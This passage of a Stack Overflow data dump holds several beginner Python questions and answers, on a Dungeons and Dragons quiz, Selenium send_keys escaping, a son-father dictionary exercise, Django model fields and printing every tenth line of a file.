         old_counter_value = counters[CharacterProperty][character_property]\n            new_counter_value = old_counter_value + increment_value\n            counters[CharacterProperty].update({character_property: new_counter_value})\n    print(\"-\" * 20)\n\n# The quiz for-loop is now over\n# Determine which counter has the highest value\n\ndef get_max_property(dictionary):\n    return max(dictionary.items(), key=lambda pair: pair[1])\n\ncharacter_type, character_type_points = get_max_property(counters[CharacterType])\ncharacter_attribute, character_attribute_points = get_max_property(counters[CharacterAttribute])\ncharacter_alignment, character_alignment_points = get_max_property(counters[CharacterAlignment])\n\nprint(f\"You have the heart of a {character_type.name} with {character_type_points} point(s)!\")\nprint(f\"Your highest attribute is {character_attribute.name} with {character_attribute_points} points.\")\nprint(f\"Your alignment: {character_alignment.name}\")\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 12265753, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDl1xEX2J2m3DsHQzH2AnjM50FrzWcm0bTi3MqV-fw=k-s128", "display_name": "Isaac Ostlund", "link": "https://stackoverflow.com/users/12265753/isaac-ostlund"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "accepted_answer_id": 58532516, "answer_count": 1, "score": 0, "last_activity_date": 1571935271, "creation_date": 1571872350, "last_edit_date": 1571873970, "question_id": 58532084, "link": "https://stackoverflow.com/questions/58532084/making-an-in-depth-quiz-for-dungeons-and-dragons", "title": "Making an in depth &quot;quiz&quot; for Dungeons and Dragons", "body": "<p>I've been struggling to make a quiz with a randomized question bank where the questions will be able to increase a number of different counters (each question will be different in what they return). Below i show what i have so far and two example questions with only a few of the \"counter increases\" that they will ultimately have. Is there a way to put the questions i have into a bank so each time the quiz is run it has a different 20 questions from a bank of 50 or so?</p>\n\n<pre><code>barbarian_count = 0\nbard_count = 0\ncleric_count = 0\ndruid_count = 0\nfighter_count = 0\nmonk_count = 0\npaladin_count = 0\nranger_count = 0\nrogue_count = 0\nsorcerer_count = 0\nwarlock_count = 0\nwizard_count = 0\n\nSTR_count = 0\nDEX_count = 0\nCON_count = 0\nINT_count = 0\nWIS_count = 0\nCHA_count = 0\n\nlaw_count = 0\nchaos_count = 0\nneutrallc_count = 0\n\ngood_count = 0\nneutralge_count = 0\nevil_count = 0\n\nAcolyte_count = 0\nCharlatan_count = 0\nCriminalSpy_count = 0\nEntertainer_count = 0\nFolkhero_count = 0\nGladiator_count = 0\nGuildartmerchant_count = 0\nhermit_count = 0\nknight_count = 0\nnoble_count = 0\noutlander_count = 0\npirate_count = 0\nsage_count = 0\nsailor_count = 0\nsoldier_count = 0\nurchin_count = 0\n\n\nq1_answer = input (\"Passion or Reason? \\na) Passion \\nb) Reason\\n\")\n\nif q1_answer.lower() == \"a\":\n    barbarian_count += 1\n  bard_count += 1\n  chaos_count += 1\nelif q1_answer.lower() == \"b\":\n    wizard_count += 1\n  law_count += 1\nelse:\n    print(\"sorry, try again.\")\n\n\nq2 = q2_answer = input (\"Fame or Honor? \\na) Fame \\nb) Honor\\n\")\n\nif q2_answer.lower() == \"a\":\n    bard_count += 1\nelif q2_answer.lower() == \"b\":\n    paladin_count += 1\nelse:\n    print(\"sorry, try again.\")\n\n\n\n\nif barbarian_count &gt; wizard_count and barbarian_count &gt; bard_count and barbarian_count &gt; paladin_count:\n    print(\"You have the heart of a barbarian\")\nelif wizard_count &gt; barbarian_count and wizard_count &gt; bard_count and wizard_count &gt; paladin_count:\n    print(\"You have the heart of a wizard\")\nelif bard_count &gt; wizard_count and bard_count &gt; paladin_count and bard_count &gt; barbarian_count:\n  print(\"You have the heart of a bard\")\nelif paladin_count &gt; wizard_count and paladin_count &gt; barbarian_count and paladin_count &gt; bard_count:\n  print(\"You have the heart of a paladin\")\n\ninput('Press ENTER to exit')\n</code></pre>\n\n<p>I tried making a list with something like </p>\n\n<pre><code>question_bank = [\n  {\n    'q1 = [q1_answer = input (\"Passion or Reason? \\na) Passion \\nb) Reason\\n\")\n\nif q1_answer.lower() == \"a\":\n    barbarian_count += 1\nelif q1_answer.lower() == \"b\":\n    wizard_count += 1\nelse:\n    print(\"sorry, try again.\"]'\n  },\n  {\n    'q2 = q2_answer = input (\"Fame or Honor? \\na) Fame \\nb) Honor\\n\")\n\nif q2_answer.lower() == \"a\":\n    bard_count += 1\nelif q2_answer.lower() == \"b\":\n    paladin_count += 1\nelse:\n    print(\"sorry, try again.\")'\n  }\n]\n\n\n</code></pre>\n\n<p>But have realized lists do not work like that, i think.</p>\n\n<p>Any advice? I was hoping i could put each full script for each question into a list so i could use the \"import random\" and random.choice or random.sample to then pull the full question's script.</p>\n"}, {"tags": ["python", "selenium"], "comments": [{"owner": {"reputation": 15430, "user_id": 4518341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eVuAv.png?s=128&g=1", "display_name": "wjandrea", "link": "https://stackoverflow.com/users/4518341/wjandrea"}, "edited": false, "score": 1, "creation_date": 1571873592, "post_id": 58532083, "comment_id": 103388081, "body": "It would help if you made a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Welcome to Stack Overflow btw!"}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1571877639, "post_id": 58532083, "comment_id": 103388771, "body": "Are you using Selenium? If so, please tag your question with it."}, {"owner": {"reputation": 1, "user_id": 12265760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a38c4cc562698ab7c43d98d07c66c562?s=128&d=identicon&r=PG&f=1", "display_name": "TChrisev", "link": "https://stackoverflow.com/users/12265760/tchrisev"}, "edited": false, "score": 0, "creation_date": 1571935946, "post_id": 58532083, "comment_id": 103412871, "body": "Added the code sample to show the issue and marked the question as Selenium related per wjandrea and marineau"}, {"owner": {"reputation": 1, "user_id": 12265760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a38c4cc562698ab7c43d98d07c66c562?s=128&d=identicon&r=PG&f=1", "display_name": "TChrisev", "link": "https://stackoverflow.com/users/12265760/tchrisev"}, "edited": false, "score": 0, "creation_date": 1571938035, "post_id": 58532083, "comment_id": 103413781, "body": "If I replace the &quot;/&quot; with &quot;&amp;#47&quot; or with %2f, the send_keys works as expected though the process that consumes this information does not like either..."}, {"owner": {"reputation": 1, "user_id": 12265760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a38c4cc562698ab7c43d98d07c66c562?s=128&d=identicon&r=PG&f=1", "display_name": "TChrisev", "link": "https://stackoverflow.com/users/12265760/tchrisev"}, "reply_to_user": {"reputation": 1676, "user_id": 8411453, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3zZ4S.jpg?s=128&g=1", "display_name": "Marco D.G.", "link": "https://stackoverflow.com/users/8411453/marco-d-g"}, "edited": false, "score": 0, "creation_date": 1571946750, "post_id": 58532083, "comment_id": 103417487, "body": "@Marco D.G. I used your code directly and had the \\n written to the textarea.  the &quot;/&quot; in the url= definition still moved the cursor to the top left of the textarea and then continued writing..."}], "answers": [{"tags": [], "owner": {"reputation": 175, "user_id": 6037452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca5032d92d566cff3e17e56b43358f14?s=128&d=identicon&r=PG&f=1", "display_name": "Jacob Kaddoura", "link": "https://stackoverflow.com/users/6037452/jacob-kaddoura"}, "is_accepted": false, "score": 0, "last_activity_date": 1571872720, "creation_date": 1571872720, "answer_id": 58532134, "question_id": 58532083, "link": "https://stackoverflow.com/questions/58532083/how-to-escape-in-send-keys/58532134#58532134", "title": "How to escape &quot;/&quot; in send_keys?", "body": "<p>Backslash '\\' is the escape character</p>\n\n<p>So try \\ / (space in between so it doesn't look like a V but you obv want without the space)</p>\n"}], "owner": {"reputation": 1, "user_id": 12265760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a38c4cc562698ab7c43d98d07c66c562?s=128&d=identicon&r=PG&f=1", "display_name": "TChrisev", "link": "https://stackoverflow.com/users/12265760/tchrisev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 75, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1572043028, "creation_date": 1571872346, "last_edit_date": 1572043028, "question_id": 58532083, "link": "https://stackoverflow.com/questions/58532083/how-to-escape-in-send-keys", "title": "How to escape &quot;/&quot; in send_keys?", "body": "<p>Running a script that writes a block of code into a textarea on a website.  The first four \"lines\" write correctly until <code>var url = \"https:</code> at which point the cursor jumps to the upper left of the text area and then continues writing.  Each time the <code>/</code> character is come across, the cursor returns to the upper left before continuing writing.</p>\n\n<p>How can I prevent the cursor being affected.</p>\n\n<p>I have tried <code>\\/</code>, <code>\\\\/</code>, <code>{/}</code>, and similar ways to escape the slash.</p>\n\n<pre><code>self.driver.find_element_by_id('textarea').send_keys(\n        '\\nvar device = this\\n\\nvar url = \"' + baseurl + '/' + firmwarename + '\"\\n\\nvar conv = TR69.createConnection(device)\\n\\ntry {'+\n   'var uuid = java.util.UUID.randomUUID().toString().replace(\"-\",\"\") \\n'+\n</code></pre>\n\n<p>What it physically does:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>myhiddenurl.comSG9C130016_prod-mycomponent-5260-8a.27.103-combined-squashfs.img.gsdf\"\nvar conv = TR69.createConnection(device)\nvar device = this\nvar url = \"http:\n</code></pre>\n\n<p>Notice that lines 3 and 4 should be 1 and 2.  And that line 1 is the continuation of what is now line 4.</p>\n\n<p>Here is sample code which shows the issue...</p>\n\n<pre><code>    firmwarename = \"tchrisdemo-code-3-2-3.gsdf\"\n    self.driver.get(\"https://futureoftesting.us/os.html\")\n    self.driver.find_element_by_id('textarea').clear()\n    baseurl = \"http://myhiddendomain.com/\"\n    self.driver.find_element_by_id('textarea').send_keys(\n        '\\nvar device = this\\n\\nvar url = \"' + baseurl + '/' + \n    firmwarename + '\"\\n\\nvar conv = TR69.createConnection(device)\\n\\ntry {'+\n   'var uuid = java.util.UUID.randomUUID().toString().replace(\"-\",\"\") \\n'+\n   'var dlRequest = new TR69.DownloadRequest() \\n' )\n</code></pre>\n\n<p>Line 5 of the code is the problem...</p>\n\n<p>I've tried a variety of changes akin to your comment.  The .format one allowed one allowed one \"/\" through then jumped to the top of the textarea and continued writing on the next one.  </p>\n\n<pre class=\"lang-py prettyprint-override\"><code>    baseurl = r\"http://myhiddendomain.com/\"\n    url = \"{}/{}\".format(baseurl,firmwarename)\n    self.driver.find_element_by_id('textarea').send_keys(\n        '\\nvar device = this\\n\\nvar url = \"' + baseurl + firmwarename + '\"\\n\\nvar conv = TR69.createConnection(device)\\n\\ntry {'+\n   'var uuid = java.util.UUID.randomUUID().toString().replace(\"-\",\"\") \\n'+\n   'var dlRequest = new TR69.DownloadRequest() \\nThis is formatting: ' + url) \n</code></pre>\n\n<p>which sadly generated this: </p>\n\n<pre><code>    var dlRequest = new TR69.DownloadRequest() \n    This is formatting: http:/myhiddendomain.com/\n    var device = this    \n</code></pre>\n\n<p>Not sure I fully get this solution.<br>\nIt appears after more searching that the \"jumping cursor\" is a known problem and that the \"devs have to fix it\"</p>\n"}, {"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 12465, "user_id": 7028459, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-9L9TKwhq-xo/AAAAAAAAAAI/AAAAAAAAB1E/Sne3mYXRw9w/photo.jpg?sz=128", "display_name": "Calum You", "link": "https://stackoverflow.com/users/7028459/calum-you"}, "edited": false, "score": 2, "creation_date": 1571872080, "post_id": 58532038, "comment_id": 103387778, "body": "If keys are sons and values are fathers, first find the father, then look through the keys again for that father&#39;s name (value)."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1571872187, "post_id": 58532038, "comment_id": 103387797, "body": "A grandfather is just the father of the father."}, {"owner": {"reputation": 95, "user_id": 9950879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/faec9efcebbe39c37ca34d2eabc75cef?s=128&d=identicon&r=PG&f=1", "display_name": "Henry", "link": "https://stackoverflow.com/users/9950879/henry"}, "edited": false, "score": 0, "creation_date": 1571905894, "post_id": 58532038, "comment_id": 103396937, "body": "Ok, I sort of understand what you mean, I know the grandfather is just a father of the father, I don&#39;t see how going through the keys again will find their grandfather, how would I implement this?"}, {"owner": {"reputation": 17225, "user_id": 2823719, "user_type": "registered", "accept_rate": 11, "profile_image": "https://i.stack.imgur.com/TWgf9.jpg?s=128&g=1", "display_name": "Booboo", "link": "https://stackoverflow.com/users/2823719/booboo"}, "edited": false, "score": 0, "creation_date": 1571911170, "post_id": 58532038, "comment_id": 103399709, "body": "Given a son <code>son_choice</code>, <code>names[son_choice]</code> would be the son&#39;s father, right? So who is the father of <code>names[son_choice]</code>?"}, {"owner": {"reputation": 95, "user_id": 9950879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/faec9efcebbe39c37ca34d2eabc75cef?s=128&d=identicon&r=PG&f=1", "display_name": "Henry", "link": "https://stackoverflow.com/users/9950879/henry"}, "edited": false, "score": 0, "creation_date": 1571915798, "post_id": 58532038, "comment_id": 103402164, "body": "Ok I understand this, but how would I create a father to the names[son_choice], who would then be the grandfather to the son?"}, {"owner": {"reputation": 95, "user_id": 9950879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/faec9efcebbe39c37ca34d2eabc75cef?s=128&d=identicon&r=PG&f=1", "display_name": "Henry", "link": "https://stackoverflow.com/users/9950879/henry"}, "edited": false, "score": 0, "creation_date": 1571916881, "post_id": 58532038, "comment_id": 103402739, "body": "I&#39;ve had a play around and finally completed it I believe, to actually search for a grandfather in the first place, I need to create a pair for instance, tom, who&#39;s father is henry, so when I then go to find a grandfather, the result should be michael"}], "answers": [{"comments": [{"owner": {"reputation": 95, "user_id": 9950879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/faec9efcebbe39c37ca34d2eabc75cef?s=128&d=identicon&r=PG&f=1", "display_name": "Henry", "link": "https://stackoverflow.com/users/9950879/henry"}, "edited": false, "score": 0, "creation_date": 1571917430, "post_id": 58540565, "comment_id": 103403009, "body": "I&#39;ve also updated the dictionary to have older and younger generations based on the original sons, which I believe answers my own question."}], "tags": [], "owner": {"reputation": 95, "user_id": 9950879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/faec9efcebbe39c37ca34d2eabc75cef?s=128&d=identicon&r=PG&f=1", "display_name": "Henry", "link": "https://stackoverflow.com/users/9950879/henry"}, "is_accepted": false, "score": 0, "last_activity_date": 1571917132, "creation_date": 1571917132, "answer_id": 58540565, "question_id": 58532038, "link": "https://stackoverflow.com/questions/58532038/how-can-i-only-use-one-dictionary-and-be-able-to-output-a-third-value-related-to/58540565#58540565", "title": "How can I only use one dictionary and be able to output a third value related to the key pair?", "body": "<p>With the help of Ronald and a little common sense I've now solve this issue.</p>\n\n<p>For a grandfather to be found, I needed to create a new son father pair where the son's father would be a son already in the list. For example, if I create a new pair, with the son being called tom and the father being called henry. I can then use the find the grandfather function to show that tom's grandfather would be michael.</p>\n\n<pre><code>   #Find a grandfather\n    elif choice == \"5\":\n        grandson = input(\"Please enter the son and I will find the grandfather: \").lower()\n\n        if grandson in names:\n            father = names[grandson]\n            if father in names:\n                grandfather = names[father]\n                print(\"The grandfather of \" + grandson + \" is \" + grandfather)\n            else:\n                print(father + \" is not in the dictionary\")\n\n        else:\n            print(grandson + \" is not in the dictionary\")\n</code></pre>\n\n<p>This is the code I created, however, how would I make this work for several generations, or is that already accomplished by this piece of code.</p>\n"}], "owner": {"reputation": 95, "user_id": 9950879, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/faec9efcebbe39c37ca34d2eabc75cef?s=128&d=identicon&r=PG&f=1", "display_name": "Henry", "link": "https://stackoverflow.com/users/9950879/henry"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 94, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571917132, "creation_date": 1571871962, "question_id": 58532038, "link": "https://stackoverflow.com/questions/58532038/how-can-i-only-use-one-dictionary-and-be-able-to-output-a-third-value-related-to", "title": "How can I only use one dictionary and be able to output a third value related to the key pair?", "body": "<p>I've been set a task by my lecturer to complete a couple challenges to help improve my understanding of dictionaries and the concepts behind them. I've been able to complete the first task quite easily but I'm quite stuck with the second task. The first task was to create a 'Who's your Daddy? program'. </p>\n\n<p>The challenge states: Write a Who's Your Daddy program that lets the user enter the name of a male and produces the name of his father. (You can use celebrities, fictional characters, or even historical figures for fun.) Allow the user to add, replace, and delete son-father pairs.</p>\n\n<p>I was able to create this challenge with only one issue where I could only replace a father of a son and not both.</p>\n\n<p>The second challenge states: Improve this program by adding a choice that lets the user enter a name and get back a grandfather. Your program should still only use one dictionary of son-father pairs. Make sure to include several generations in you dictionary so that a match can be found.</p>\n\n<p>I thought that I could maybe use a dictionary nested in a dictionary and researched that, but it only stated one dictionary. I then thought could I use a tuple within a dictionary and then access this tuple when the user requests a son and their grandfather, but have not had much luck with this either, so I decided to come on here. </p>\n\n<p>So now I wonder, how can I add grandfathers to each of the pairs, can you add a second value to a key in a dictionary?</p>\n\n<pre><code>\nnames = { \"henry\" : \"michael\",\n          \"louis\" : \"jason\",\n          \"owen\"  : \"justin\",\n          \"jake\" : \"glynn\",\n          \"adam\" : \"mark\",\n          }\n\nchoice = None\n\nwhile choice != \"0\":\n\n    print(\n        \"\"\"\n        Welcome to the Who's Your Daddy? program.\n        You can find out a father of the names listed,\n        you can then add, replace and delete a son/father pair.\n        0 - Exit\n        1 - List sons and their fathers\n        2 - Add a pair\n        3 - Replace a pair\n        4 - Delete a pair\n        \"\"\"\n        )\n\n    choice = input(\"Choice: \")\n\n    #exit\n    if choice == \"0\":\n        print(\"Goodbye\")\n\n    #List sons\n    if choice == \"1\":\n        print(*names.keys(), sep='\\n')   \n        son_choice = input(\"Who's father would you like to know the name of?: \")\n        if son_choice in names:\n            print(names[son_choice])\n        else:\n            print(\"That name is not in the list!\")\n\n    #Add a pair\n    elif choice == \"2\":\n        son_add = input(\"Enter the name of someone: \").lower()\n        if son_add not in names:\n            father_add = input(\"Now enter the name of their father: \").lower()\n            names[son_add] = father_add\n            print(\"That pair has been added\")\n        else:\n            print(\"That name already exists!\")\n\n\n    #Replace a pair\n    elif choice == \"3\":\n        son_replace = input(\"What name do you want to replace?: \")\n        if son_replace in names:\n            father_replace = input(\"Enter the name of their father: \")\n            names[son_replace] = father_replace\n            print(\"The pair has been replaced\")\n        else:\n            print(\"That name doesn't exist, please add it first!\")\n\n    #Delete a pair\n    elif choice == \"4\":\n        son_delete = input(\"What name do you want me to delete?: \")\n        if son_delete in names:\n            del names[son_delete]\n            print(\"Pair deleted!\")\n        else:\n            print(\"That pair does not exist!\")\n\n    else:\n        print(\"Sorry, that's an invalid choice!\")\n\ninput(\"\\n\\nPress the enter key to exit!\")\n\n\n\n\n</code></pre>\n"}, {"tags": ["python", "django", "anaconda", "blogs"], "answers": [{"comments": [{"owner": {"reputation": 81, "user_id": 10711720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cd78c8a2a55ec52e0aca62217e044cb?s=128&d=identicon&r=PG&f=1", "display_name": "ROCA", "link": "https://stackoverflow.com/users/10711720/roca"}, "edited": false, "score": 0, "creation_date": 1571872876, "post_id": 58532073, "comment_id": 103387931, "body": "This is correct, I did use 4 spaces and it doesn&#180;t break the site anymore, I am getting a database error on the frontend of my site: OperationalError at / no such column: blog_post.tipo Request Method:\tGET Request URL:\thttp:XXXXX Django Version:\t2.2.5 Exception Type:\tOperationalError Exception Value:\t no such column: blog_post.tipo Exception Location:\t\\conda\\conda\\envs\\djangoenv\\lib\\site-packages\\djan&zwnj;&#8203;go\\db\\backends\\sqlit&zwnj;&#8203;e3\\base.py in execute, line 383"}, {"owner": {"reputation": 2020, "user_id": 3279603, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9zp3k.jpg?s=128&g=1", "display_name": "aminrd", "link": "https://stackoverflow.com/users/3279603/aminrd"}, "reply_to_user": {"reputation": 81, "user_id": 10711720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cd78c8a2a55ec52e0aca62217e044cb?s=128&d=identicon&r=PG&f=1", "display_name": "ROCA", "link": "https://stackoverflow.com/users/10711720/roca"}, "edited": false, "score": 1, "creation_date": 1571873019, "post_id": 58532073, "comment_id": 103387960, "body": "Have you tried these commands: <code>python3 manage.py makemigrations</code> and then <code>python manage.py migrate</code> ? Anyway, this is a different question. I suggest close this question and start over to follow new problems"}, {"owner": {"reputation": 81, "user_id": 10711720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cd78c8a2a55ec52e0aca62217e044cb?s=128&d=identicon&r=PG&f=1", "display_name": "ROCA", "link": "https://stackoverflow.com/users/10711720/roca"}, "edited": false, "score": 0, "creation_date": 1571873693, "post_id": 58532073, "comment_id": 103388097, "body": "this is it, @aminrd. A rookie mistake here... well, that is the only way to learn! Please write it as an answer so I can properly award you."}, {"owner": {"reputation": 2020, "user_id": 3279603, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9zp3k.jpg?s=128&g=1", "display_name": "aminrd", "link": "https://stackoverflow.com/users/3279603/aminrd"}, "reply_to_user": {"reputation": 81, "user_id": 10711720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cd78c8a2a55ec52e0aca62217e044cb?s=128&d=identicon&r=PG&f=1", "display_name": "ROCA", "link": "https://stackoverflow.com/users/10711720/roca"}, "edited": false, "score": 0, "creation_date": 1571874051, "post_id": 58532073, "comment_id": 103388156, "body": "You can find your answer in this link: <a href=\"https://www.dev2qa.com/how-to-add-new-model-field-to-exist-django-model/\" rel=\"nofollow noreferrer\">dev2qa.com/how-to-add-new-model-field-to-exist-django-model</a>"}, {"owner": {"reputation": 2020, "user_id": 3279603, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9zp3k.jpg?s=128&g=1", "display_name": "aminrd", "link": "https://stackoverflow.com/users/3279603/aminrd"}, "reply_to_user": {"reputation": 81, "user_id": 10711720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cd78c8a2a55ec52e0aca62217e044cb?s=128&d=identicon&r=PG&f=1", "display_name": "ROCA", "link": "https://stackoverflow.com/users/10711720/roca"}, "edited": false, "score": 0, "creation_date": 1571874128, "post_id": 58532073, "comment_id": 103388169, "body": "For new fields, you should have a default value if you want to keep your current database before executing <code>makemigrations</code> and <code>migrate</code> commands"}], "tags": [], "owner": {"reputation": 2020, "user_id": 3279603, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9zp3k.jpg?s=128&g=1", "display_name": "aminrd", "link": "https://stackoverflow.com/users/3279603/aminrd"}, "is_accepted": true, "score": 2, "last_activity_date": 1571872265, "creation_date": 1571872265, "answer_id": 58532073, "question_id": 58532030, "link": "https://stackoverflow.com/questions/58532030/creating-django%c2%b4s-blog-post-custom-fields/58532073#58532073", "title": "Creating Django&#180;s blog Post custom fields", "body": "<p>When you indent in python, python just expects that indentation in first line should be the same as indentation in rest of the lines, be it 4 spaces, 1 space, 1 tab, or whatever.</p>\n\n<p>As it is suggested in <a href=\"https://www.python.org/dev/peps/pep-0008/\" rel=\"nofollow noreferrer\">PEP-8</a>, we should use \"Spaces\" rather than using \"Tabs\"! Anyway, the error says you probably added those new fields with inconsistent use of tabs and spaces in indentation (i.e. probably you are using tabs instead of 4 spaces)</p>\n"}, {"tags": [], "owner": {"reputation": 61, "user_id": 12253576, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-RLadHYHUniA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdjt94HtmELykjVTVtawKBIN-rRlg/photo.jpg?sz=128", "display_name": "Neville Lemein", "link": "https://stackoverflow.com/users/12253576/neville-lemein"}, "is_accepted": false, "score": 1, "last_activity_date": 1571872483, "creation_date": 1571872483, "answer_id": 58532100, "question_id": 58532030, "link": "https://stackoverflow.com/questions/58532030/creating-django%c2%b4s-blog-post-custom-fields/58532100#58532100", "title": "Creating Django&#180;s blog Post custom fields", "body": "<p>The error means exactly as it says. Remember Python does not use curly brackets, it uses indentations. You have to make sure your lines are properly indented. I don't know the editor you are using but you can check whether there are formatting plugins or extensions for it. A quick solution though is to just delete all the white spaces then indent with the tab. Indentation is done via the tab key and not the space key.   </p>\n"}], "owner": {"reputation": 81, "user_id": 10711720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cd78c8a2a55ec52e0aca62217e044cb?s=128&d=identicon&r=PG&f=1", "display_name": "ROCA", "link": "https://stackoverflow.com/users/10711720/roca"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 211, "favorite_count": 1, "accepted_answer_id": 58532073, "answer_count": 2, "score": 0, "last_activity_date": 1571872483, "creation_date": 1571871894, "question_id": 58532030, "link": "https://stackoverflow.com/questions/58532030/creating-django%c2%b4s-blog-post-custom-fields", "title": "Creating Django&#180;s blog Post custom fields", "body": "<p>I am new to django, I am trying to add custom fields to the regular django blog Post App.</p>\n\n<p>This is the blog fields out of the box:</p>\n\n<p>models.py</p>\n\n<pre><code>from django.db import models\nfrom django.contrib.auth.models import User\n\n\nSTATUS = (\n    (0,\"Draft\"),\n    (1,\"Publish\")\n)\n\nclass Post(models.Model):\n    title = models.CharField(max_length=200, unique=True)\n    slug = models.SlugField(max_length=200, unique=True)\n    author = models.ForeignKey(User, on_delete= models.CASCADE,related_name='blog_posts')\n    updated_on = models.DateTimeField(auto_now= True)\n    content = models.TextField()\n    created_on = models.DateTimeField(auto_now_add=True)\n    status = models.IntegerField(choices=STATUS, default=0)\n\n    class Meta:\n        ordering = ['-created_on']\n\n    def __str__(self):\n        return self.title\n</code></pre>\n\n<p>I need to create 4 fields:</p>\n\n<ul>\n<li>Types (charfield length=200)</li>\n<li>Status of item (combobox with <strong>OK</strong> and <strong>NOK</strong> options)</li>\n<li>Ranking (numbers, 1-10)</li>\n<li>Deployed (charfield length=200)</li>\n</ul>\n\n<p>I have tried simply adding those fields to my models.py below but it breaks the website:</p>\n\n<pre><code>title = models.CharField(max_length=200, unique=True)\nslug = models.SlugField(max_length=200, unique=True)\nTypes = models.CharField(max_length=200, unique=True)\netc\n</code></pre>\n\n<p>Error on my anaconda prompt:\nTabError: inconsistent use of tabs and spaces in indentation</p>\n\n<p>Where else do I need to add the fields? DO I need to create a separate class? If so, how do I add to the create post backend?</p>\n"}, {"tags": ["python", "loops", "file"], "comments": [{"owner": {"reputation": 1131, "user_id": 3851798, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vZW38.jpg?s=128&g=1", "display_name": "Tejas Shah", "link": "https://stackoverflow.com/users/3851798/tejas-shah"}, "edited": false, "score": 1, "creation_date": 1571872313, "post_id": 58532012, "comment_id": 103387824, "body": "If you want to get the input from a user, look for the in-built function called input(). And yeah, as gelonida says read up on a few tutorials."}, {"owner": {"reputation": 2324, "user_id": 6144626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/w5zgz.jpg?s=128&g=1", "display_name": "Ari Cooper-Davis", "link": "https://stackoverflow.com/users/6144626/ari-cooper-davis"}, "edited": false, "score": 0, "creation_date": 1571872604, "post_id": 58532012, "comment_id": 103387880, "body": "You&#39;ve got too separate questions here, and haven&#39;t showed what is not working as expected. Can you clean up your question a bit, give us an input and expected output? I think if you do this, and maybe write some pseudo-code, you may answer your own question!"}], "answers": [{"tags": [], "owner": {"reputation": 4401, "user_id": 858675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c51db176e8886a2afbc18edd2233c18b?s=128&d=identicon&r=PG", "display_name": "gelonida", "link": "https://stackoverflow.com/users/858675/gelonida"}, "is_accepted": false, "score": 0, "last_activity_date": 1572136181, "last_edit_date": 1572136181, "creation_date": 1571872040, "answer_id": 58532053, "question_id": 58532012, "link": "https://stackoverflow.com/questions/58532012/getting-a-program-to-read-a-file-and-print-every-10th-line-of-the-file/58532053#58532053", "title": "Getting a program to read a file, and print every 10th line of the file", "body": "<p>Is this what you mean:</p>\n\n<pre><code>def print_every_nth_line(fname, n):\n    with open(fname) as fh:\n    for lineno, line in enumerate(fh):\n        if lineno % n == 0:\n            print(line)\n</code></pre>\n\n<p>I suggest to read some tutorials or documents about python and functions. This should clarify things. things like named arguments, *args, **kwargs, etc. can be quite helpful to learn.</p>\n\n<p>I also fixed the line:</p>\n\n<pre><code>if lineno % step == 10:\n</code></pre>\n\n<p>which should have been</p>\n\n<pre><code>if lineno % 10 == 0:\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 12265838, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-P9ZwUWdWgns/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3reybAQ_6ptl2gCSYIul4GsoujodRQ/photo.jpg?sz=128", "display_name": "Mitch Nicholson", "link": "https://stackoverflow.com/users/12265838/mitch-nicholson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 27, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1572136181, "creation_date": 1571871779, "last_edit_date": 1571871985, "question_id": 58532012, "link": "https://stackoverflow.com/questions/58532012/getting-a-program-to-read-a-file-and-print-every-10th-line-of-the-file", "title": "Getting a program to read a file, 